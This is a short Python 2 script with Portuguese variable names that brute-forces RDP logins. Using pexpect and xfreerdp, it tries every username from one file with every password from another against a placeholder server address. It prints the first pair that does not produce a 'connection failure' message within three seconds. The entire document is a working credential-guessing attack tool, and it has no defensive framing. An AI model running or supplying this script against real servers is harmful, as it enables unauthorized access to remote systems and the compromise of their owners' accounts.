import pexpect

host = "IP_do_servidor_RDP"
achou = False

with open("usuarios.txt", "r") as usuarios:
    with open("senhas.txt", "r") as senhas:
        while True:
            usuario = usuarios.readline().strip("\n")
            if not usuario:
                break
            while True:
                senha = senhas.readline().strip("\n")
                if not senha:
                    break
                child = pexpect.spawn( "xfreerdp /u:%s /p:%s /v:%s" %(usuario, senha, host) ) #1
                try:
                    child.expect("connection failure", timeout=3) #2
                except:
                    print "USER:", usuario
                    print "PASS:", senha
                    achou = True
                    break
            if achou:
                break
            senhas.seek(0)